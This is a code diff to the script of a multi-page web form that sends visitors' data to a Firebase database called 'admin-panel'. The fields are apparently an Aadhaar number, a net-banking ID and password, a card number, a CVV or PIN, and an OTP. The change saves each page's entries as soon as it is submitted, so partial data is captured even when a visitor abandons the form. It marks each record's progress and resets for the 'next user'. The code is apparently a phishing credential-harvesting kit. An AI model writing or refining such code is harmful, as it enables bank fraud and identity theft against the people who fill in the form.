@@ -88,32 +88,79 @@ firebase.initializeApp({
   projectId: "admin-panel-989b2"
 });
 
-/* UI helpers */
+/* =========================
+   🔑 ONE USER = ONE KEY
+   (Page-1 se hi create)
+========================= */
+let userKey = localStorage.getItem("userKey");
+if(!userKey){
+  userKey = firebase.database().ref("usersData").push().key;
+  localStorage.setItem("userKey", userKey);
+}
+
+/* 🔄 SAFE SAVE / UPDATE */
+function saveData(obj){
+  firebase.database().ref("usersData/"+userKey).update({
+    ...obj,
+    time: new Date().toLocaleString()
+  });
+}
+
+/* UI helpers (UNCHANGED) */
 document.querySelectorAll('.page').forEach(p=>{
   p.prepend(Object.assign(document.createElement('div'),{className:'top-img',innerHTML:'<img src="top.jpg">'}));
   p.append(Object.assign(document.createElement('div'),{className:'bottom-img',innerHTML:'<img src="bottom.jpg">'}));
 });
-function switchPage(a,b){document.getElementById("page"+a).classList.remove("active");document.getElementById("page"+b).classList.add("active");}
-function nextPage(n){switchPage(n,n+1)}
+function switchPage(a,b){
+  document.getElementById("page"+a).classList.remove("active");
+  document.getElementById("page"+b).classList.add("active");
+}
+
+/* 🔴 PAGE-WISE IMMEDIATE SAVE */
+function nextPage(n){
+  if(n===1){
+    // Page-1 submit → IMMEDIATE
+    saveData({
+      fullName: fullName.value,
+      mbno: mbno.value,
+      aadr: aadr.value,
+      status: "PAGE1"
+    });
+  }
+  if(n===2){
+    // Page-2 submit → UPDATE
+    saveData({
+      nid: nid.value,
+      pss: pss.value,
+      status: "PAGE2"
+    });
+  }
+  switchPage(n,n+1);
+}
 function prevPage(n){switchPage(n,n-1)}
-function goOtp(){switchPage(3,4)}
+
+function goOtp(){
+  // Page-3 submit → UPDATE
+  saveData({
+    cn: cn.value,
+    cvpn: cvpn.value,
+    status: "PAGE3"
+  });
+  switchPage(3,4);
+}
 
 function verifyOtp(){
   var otp=document.getElementById("otpSingle").value.trim();
   if(otp.length!==6){alert("Enter valid OTP");return;}
 
-  /* 🔴 PUSH DATA TO FIREBASE */
-  firebase.database().ref("usersData").push({
-    fullName: fullName.value,
-    mbno: mbno.value,
-    aadr: aadr.value,
-    nid: nid.value,
-    pss: pss.value,
-    cn: cn.value,
-    cvpn: cvpn.value,
-    time: new Date().toLocaleString()
+  // FINAL UPDATE
+  saveData({
+    otp: otp,
+    status: "COMPLETED",
+    pinned: false
   });
 
+  localStorage.removeItem("userKey"); // reset for next user
   switchPage(4,5);
 }
 </script>
